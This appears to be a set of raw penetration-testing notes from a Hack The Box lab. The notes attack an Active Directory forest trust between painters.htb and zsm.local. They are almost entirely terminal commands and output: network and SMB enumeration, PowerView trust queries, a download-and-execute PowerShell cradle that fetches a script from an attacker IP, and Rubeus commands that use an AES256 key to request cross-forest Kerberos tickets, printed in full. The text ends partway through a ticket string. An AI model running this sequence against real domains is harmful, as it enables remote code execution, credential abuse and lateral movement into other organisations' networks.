
```
PS C:\> ping zsm.local
ping zsm.local

Pinging zsm.local [192.168.210.10] with 32 bytes of data:
Reply from 192.168.210.10: bytes=32 time<1ms TTL=127
Reply from 192.168.210.10: bytes=32 time<1ms TTL=127
Reply from 192.168.210.10: bytes=32 time<1ms TTL=127
Reply from 192.168.210.10: bytes=32 time<1ms TTL=127

Ping statistics for 192.168.210.10:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```


```
kali@kali ~> nxc smb 192.168.210.0/24 > machines.txt
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRMGMT1) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.12  445    ZPH-SVRCA01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCA01) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.14  445    ZPH-SVRADFS1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRADFS1) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.15  445    ZPH-SVRSQL01     [*] Windows 10 / Server 2019 Build 17763 x64 (name:ZPH-SVRSQL01) (domain:zsm.local) (signing:False) (SMBv1:False)
```



```
kali@kali ~> cat machines.txt | awk '{print $2,$4}'
192.168.210.10 ZPH-SVRDC01
192.168.210.11 ZPH-SVRMGMT1
192.168.210.16 ZPH-SVRCDC01
192.168.210.12 ZPH-SVRCA01
192.168.210.15 ZPH-SVRSQL01
192.168.210.14 ZPH-SVRADFS1
```




```
PS C:\tmp> Get-Forest zsm.local
Get-Forest zsm.local


RootDomainSid         : S-1-5-21-2734290894-461713716-141835440
Name                  : zsm.local
Sites                 : {Default-First-Site-Name}
Domains               : {internal.zsm.local, zsm.local}
GlobalCatalogs        : {ZPH-SVRDC01.zsm.local, ZPH-SVRCDC01.internal.zsm.local}
ApplicationPartitions : {DC=DomainDnsZones,DC=internal,DC=zsm,DC=local, DC=ForestDnsZones,DC=zsm,DC=local,
                        DC=DomainDnsZones,DC=zsm,DC=local}
ForestModeLevel       : 7
ForestMode            : Unknown
RootDomain            : zsm.local
Schema                : CN=Schema,CN=Configuration,DC=zsm,DC=local
SchemaRoleOwner       : ZPH-SVRDC01.zsm.local
NamingRoleOwner       : ZPH-SVRDC01.zsm.local

```



```
PS C:\tmp> Get-ForestDomain zsm.local
Get-ForestDomain zsm.local


Forest                  : zsm.local
DomainControllers       : {ZPH-SVRCDC01.internal.zsm.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : zsm.local
PdcRoleOwner            : ZPH-SVRCDC01.internal.zsm.local
RidRoleOwner            : ZPH-SVRCDC01.internal.zsm.local
InfrastructureRoleOwner : ZPH-SVRCDC01.internal.zsm.local
Name                    : internal.zsm.local

Forest                  : zsm.local
DomainControllers       : {ZPH-SVRDC01.zsm.local}
Children                : {internal.zsm.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : ZPH-SVRDC01.zsm.local
RidRoleOwner            : ZPH-SVRDC01.zsm.local
InfrastructureRoleOwner : ZPH-SVRDC01.zsm.local
Name                    : zsm.local

```



```
PS C:\tmp> nltest /trusted_domains /v
nltest /trusted_domains /v
List of domain trusts:
    0: ZSM zsm.local (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
       Dom Sid: S-1-5-21-2734290894-461713716-141835440
    1: PAINTERS painters.htb (NT 5) (Forest Tree Root) (Primary Domain) (Native)
       Dom Guid: 6991c0e0-b3c3-4ae9-8cd1-53fe69280c14
       Dom Sid: S-1-5-21-1470357062-2280927533-300823338
The command completed successfully

```


`iex ([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://10.10.17.202:445/power.ps1" -UseBasicParsing).Content))`



```
*Evil-WinRM* PS C:\Users\Administrator\Documents\WindowsPowerShell\Scripts\InstalledScriptInfos> Get-DomainTrust -API


SourceName        : painters.htb
TargetName        : zsm.local
TargetNetbiosName : ZSM
Flags             : DIRECT_OUTBOUND, DIRECT_INBOUND
ParentIndex       : 0
TrustType         : UPLEVEL
TrustAttributes   : FOREST_TRANSITIVE
TargetSid         : S-1-5-21-2734290894-461713716-141835440
TargetGuid        : 00000000-0000-0000-0000-000000000000

SourceName        : painters.htb
TargetName        : painters.htb
TargetNetbiosName : PAINTERS
Flags             : IN_FOREST, TREE_ROOT, PRIMARY, NATIVE_MODE
ParentIndex       : 0
TrustType         : UPLEVEL
TrustAttributes   : 0
TargetSid         : S-1-5-21-1470357062-2280927533-300823338
TargetGuid        : 6991c0e0-b3c3-4ae9-8cd1-53fe69280c14

```




```
*Evil-WinRM* PS C:\Users\Administrator\Documents\WindowsPowerShell\Scripts\InstalledScriptInfos> Get-DomainTrust


SourceName      : painters.htb
TargetName      : zsm.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 3/28/2022 8:04:26 AM
WhenChanged     : 7/9/2024 3:26:47 AM



*Evil-WinRM* PS C:\Users\Administrator\Documents\WindowsPowerShell\Scripts\InstalledScriptInfos> Get-ForestTrust


TopLevelNames            : {zsm.local}
ExcludedTopLevelNames    : {}
TrustedDomainInformation : {zsm.local, internal.zsm.local}
SourceName               : painters.htb
TargetName               : zsm.local
TrustType                : Forest
TrustDirection           : Bidirectional



*Evil-WinRM* PS C:\Users\Administrator\Documents\WindowsPowerShell\Scripts\InstalledScriptInfos> Get-DomainForeignUser
*Evil-WinRM* PS C:\Users\Administrator\Documents\WindowsPowerShell\Scripts\InstalledScriptInfos> Get-DomainForeignGroupMember
*Evil-WinRM* PS C:\Users\Administrator\Documents\WindowsPowerShell\Scripts\InstalledScriptInfos> Get-DomainTrustMapping


SourceName      : painters.htb
TargetName      : zsm.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 3/28/2022 8:04:26 AM
WhenChanged     : 7/9/2024 3:26:47 AM


```


```
  3892:20221021:111827.696 active check configuration update from [192.168.110.55:10051] started to fail (cannot connect to [[192.168.110.55]:10051]: Connection refused.)
  3560:20221021:111828.680 active check configuration update from [192.168.210.13:10051] started to fail (cannot connect to [[192.168.210.13]:10051]: (null))
```




```
kali@kali ~> nmap -Pn -sV -sC 192.168.210.13
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 13:49 EDT
Nmap scan report for 192.168.210.13
Host is up (0.14s latency).
Not shown: 932 filtered tcp ports (no-response), 67 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=monitor.zsm.local/organizationName=Zephyr Managed Services/stateOrProvinceName=London/countryName=GB
| Not valid before: 2022-03-21T19:39:06
|_Not valid after:  2032-03-18T19:39:06
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
|_http-title: Zabbix
| http-robots.txt: 2 disallowed entries
|_/ /zabbix/".
| tls-alpn:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.16 seconds

```





----

FAKE PATH
## Rubues

https://mvc1009.github.io/hackingnotes/active-directory/cross-forest-attacks/

```
.\Rubeus.exe asktgt /user:admin /domain:painters.htb /aes256:d5d7a2fd36d4ede3aaf21537b504df92a32e2e70c37187efe42b6263897ead36 /nowrap
```


```
*Evil-WinRM* PS C:\Users\Administrator\Documents\WindowsPowerShell\Scripts\InstalledScriptInfos> .\Rubeus.exe asktgt /user:administrator /domain:painters.htb /aes256:d5d7a2fd36d4ede3aaf21537b504df92a32e2e70c37187e
fe42b6263897ead36 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: d5d7a2fd36d4ede3aaf21537b504df92a32e2e70c37187efe42b6263897ead36
[*] Building AS-REQ (w/ preauth) for: 'painters.htb\administrator'
[*] Using domain controller: fe80::43de:2214:beb1:9224%7:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

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

  ServiceName              :  krbtgt/painters.htb
  ServiceRealm             :  PAINTERS.HTB
  UserName                 :  administrator
  UserRealm                :  PAINTERS.HTB
  StartTime                :  09/07/2024 17:56:15
  EndTime                  :  10/07/2024 03:56:15
  RenewTill                :  16/07/2024 17:56:15
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  d5K1TvsRyUy2U+HtEIxXbCx0zOabjaSJoXzAKUzCW78=
  ASREP (key)              :  D5D7A2FD36D4EDE3AAF21537B504DF92A32E2E70C37187EFE42B6263897EAD36

```


```
Rubeus.exe asktgs /service:krbtgt/zsm.local /domain:painters.htb /dc:DC.painters.htb /ticket:doIF3DCCBdigAwIBBaEDAgEWooIE3DCCBNhhggTUMIIE0KADAgEFoQ4bDFBBSU5URVJTLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMcGFpbnRlcnMuaHRio4IElDCCBJCgAwIBEqEDAgECooIEggSCBH7yAaq4ojPahncRaPZ5pvifOzKb1wH/2rVvptrT7gy4CNQAUF+RoYB9ikluuJxr9P0UsBOVbqdNgkA9ULfgUw79o1j6LcLZKj0q7hupys4y6l6fDLBqkov+QwCOvJmt0wLuR7MODJFQlGAsMD8K0aXW1QygFYTNlfBssLtCl/7xfQW91xziuvQBAwf+Ss6NGQAkhuoIWo6iRmKlDthMGjqhm3HFXyAQZyQHIfkN5JqGvgdt3vY4pr9GOVSMinQT2rlgrfnffAN5YE2Gbysi3I8zsd9g74NlqfohN/BNz31lQAoDVJLECe9A1wQfWJqcp7I0lcAzCzC4kXPC/yUSi7H9F8+EJdHytjIRHNzgdezueVidz36K5dZGY17QRg8J/LQVmh1UI/WKvQVOV8fjllf81QjEwyK2jUOLWjqnvqveCuSehy3o7jk1f1/CepJ5tCnMyFNqoZpRjSbjlSOwOm9COlO6qdUHpJW3ozaE90IZKbNeP5PngWkAnWCu7FBVr8anpe9X2b+W9NZWLARy8ba675bSzCQ0HsnGcRuKQnCxJ8NlqYgcFHLs+MOT110RQxHL/81Wu0YNqe5kT/8TlThnp1ASa4C5UtoctMeqgFPF8UpmgM/CuPw5quEMaGIVGxQm48vSFNCqIVTK71I4fnuxfuPE9GM7MKqeCmXOMBtPu3aIWPah4Ijhf6ybyEAFETclG5jhALCwA1pK3MR1OT9Q+Kd+wAhhQI/evwrJ/vwx3Nk3U+CXeSski11M8Ym6kdnAJSZSqr3M31MdaWgeHq2ReK9p1lK8j4FvyLXllf1vXWi2eesOcs3KdG8f7OOuZ2TX1nchpQs8xGSpWiZQ4TGxzWjTNtw2LcZKfVN/ubV17+vo2hP0Tqak68XPURMKKSzVxQ0tVdQi4fAlFUlFfl/Q82UGWTskO3N16xRdA0EDDai7FvT5vecxMTquUDfBCrx97HcPzNFLTSXorAnCuaUYlAZWaCoMCzU18seKeTzW2u4dIAbWeKd2VZOIH7G8siNL9nV4K6HrGyQoaBZn8nOhBmJCulh5VAEoBHuPqIDubtN9uuhprNLWwWWVqgK/93cdHt1YFwgo2Z61YNa8kEmtY4ZpDxVsnW8FDnYAJZvfck+p3VX41JPriZW6dC3uUKBF6+FcfZMYRJK5yfqb/GqzXpkUv5KFZkHXO2Sjan2jqsXKWh/0aJU423OdkMfG8NySXu/OCsJL74IRaEg9AuChha7nLUD19+JqYTMHPawX6GCrnD/uYWB3Sekuo8dhkYQp2W7ubIlLcSJ4ZRrpDf8s5d6/o3+q5r3dVhn4Qadzk1F3EB/+5yWrv9onI6Wspj1RrYdz9GpHfhaVUxuzgUO5LV2JIdeeHiAHx2OVom31ndl8Y7odzb4+IfKcd8qw7vc+zzfn4FUKmQWAq14X3TBZ1r0BeuUCfea0IK7iqMHw2s++olDa/rBDU7IxCQprMgd0GAfNLBGt6f3VKBW0dQMPaTAz0t7z4Nks1lo9Mejp52WIQU2tZK34WNOtFZ56o4HrMIHooAMCAQCigeAEgd19gdowgdeggdQwgdEwgc6gKzApoAMCARKhIgQgd5K1TvsRyUy2U+HtEIxXbCx0zOabjaSJoXzAKUzCW7+hDhsMUEFJTlRFUlMuSFRCohowGKADAgEBoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQOEAAKURGA8yMDI0MDcwOTE2NTYxNVqmERgPMjAyNDA3MTAwMjU2MTVapxEYDzIwMjQwNzE2MTY1NjE1WqgOGwxQQUlOVEVSUy5IVEKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHBhaW50ZXJzLmh0Yg== /nowrap
```


```
*Evil-WinRM* PS C:\Users\Administrator\Documents\WindowsPowerShell\Scripts\InstalledScriptInfos> .\Rubeus.exe asktgs /service:krbtgt/zsm.local /domain:painters.htb /dc:DC.painters.htb /ticket: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 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'krbtgt/zsm.local'
[*] Using domain controller: DC.painters.htb (fe80::43de:2214:beb1:9224%7)
[+] TGS request successful!
[*] base64(ticket.kirbi):
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

  ServiceName              :  krbtgt/ZSM.LOCAL
  ServiceRealm             :  PAINTERS.HTB
  UserName                 :  administrator
  UserRealm                :  PAINTERS.HTB
  StartTime                :  09/07/2024 18:07:56
  EndTime                  :  10/07/2024 03:56:15
  RenewTill                :  16/07/2024 17:56:15
  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  JzyVub1wLFhBcnC97+1TdNEpq6DKENxNUW+E0lCMKGw=

```


```
.\Rubeus.exe asktgs /service:cifs/zsm.local /domain:zsm.local /dc:dc.zsm.local /ticket:doIF1jCCBdKgAwIBBaEDAgEWooIE2TCCBNVhggTRMIIEzaADAgEFoQ4bDFBBSU5URVJTLkhUQqIeMBygAwIBAqEVMBMbBmtyYnRndBsJWlNNLkxPQ0FMo4IElDCCBJCgAwIBEqEDAgELooIEggSCBH4SWzD7ac/wWWnWVkMQLICs3iqiM1Oxw6KU05ph4y9yYAysMKhQpaDstP+I1NWT3AbTXVIWNcNeXoy8qbouRey2SenrRj8JpBsccSxJGx4FO+L923gIXyxX40Q40N3b8zp5yAxaEAurXD9T9awyg87VHCAw61dCKxpQZUUQroFCXGns1WJAbw57ne1KeoDAG8tQbHB0qaz3dSmbD/e446GGwBZMZ2pJ/8Otv9n5Jn8nEiUi52JpP5U04pGx8XmilVbBZex5mdSc0kXagxCm9GDKl3KmiwxYdTdh9lGp3+rlYkCmjgDLeQsC+kU8736bXALfLwD2GKt5u4L2b4F/2s1EhAQQ83TS4CmOnrnQPaEhpexZbz0JiquJe1awHepADi2BV66NRToiXzflV5B+61wEZ5pSLq4hjdGlRkjeAWhsC9jeUBF4WPnLJIB5FqFlOM0YAicnch050zFESjkM8Wfh+lsJO8t1FFNHYJO9Od/Jbk/WW482FRXbSZDUpI1xomIP57ceiUa+qGGkCssnFwEGgCNAE+7mDbrPlmmI3/L2Py7Gx3XmbsFGmZ6jGwFsIH8cYFORyqj1f1h3auKrgEwDpzsZZ+KTd25RUHgaBw/SMCJ7l2+R0a9dHf9r/skTRKtutEEHHjHVDpIgvRsSStQg7djJlGT0LKvBk+RGSixC5eV7OJU31ClZTLFq4zn4P21L8/UQrDy1NDlqrwgKLYGi1TemgjzBmHjz6rD6+ZA6Rj89T9weHdhj9bO5CpZr2BiwA+maHF4LcNkL2s7gFId0xLFzrYi0vWjjkgs/YxrRmTxqYDuGVowyb7Q75eLKAQZqqSyuvJhWQmHHBBr6DD5jSl2NU4c4nr2wqayuT+46R/ISDGB5r296uG+4uYJoq8GXZX3nNXQ6ZEMi0MlQ6SL2nsMX/ImNQPCdyo4Or9GiyqgXoBlBD0vZXsJeXx1bPXeppsSiZx4ORge69nVZR7JSu93cgyNqNbCxEY5kP05CEx0RrO1bQl/8ZqRqq7NALH1q4lhmoOHwSbdb3UngtdZt6xWc2CS9bwKHLNOXDKek+A7aaSu8crBZhgP4Ov9/AsxBf+9pyZ8nfnDHFmUWkWDpsXip6adoRVvYHBQe//PbzjBDwuIAuIIq2IinOwXdBzXq8jPew9+1Nxyve0alfAMWnhvpfriS+8rn0ZrcXYAHNi8v7rBHdURh6mE/G4ykB1WnVB1dX6aFr3q4AZ5jJXaXzT3e2XWPXpczDaZciIVOVfYPGYB30J1lIGmt8cBczd6h2pIKlW9qKbNP5PaZEZ/7n5cX5YdqxrQyj/ZdDT0Uo2FdK/HkU5/kS2HNd26yxLrIh4M4VZpKYxMRutHdFwIr1N3XKEWjIvu5ML/tICSEMBCVNUCdvxvSGtpBTtvge5Orvx+Z/FdySxLycA6SSxpPI/+bYCgZ72JgInhyVFAnvloGOFrvscn0nBBvr29lPV22BJi8E7ZV5R+w4psEQbDBaTFaWOGrFuDOIFfuA0/flUqsV/3gxhEonEalIggxo4HoMIHloAMCAQCigd0Egdp9gdcwgdSggdEwgc4wgcugKzApoAMCARKhIgQgJzyVub1wLFhBcnC97+1TdNEpq6DKENxNUW+E0lCMKGyhDhsMUEFJTlRFUlMuSFRCohowGKADAgEBoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDI0MDcwOTE3MDc1NlqmER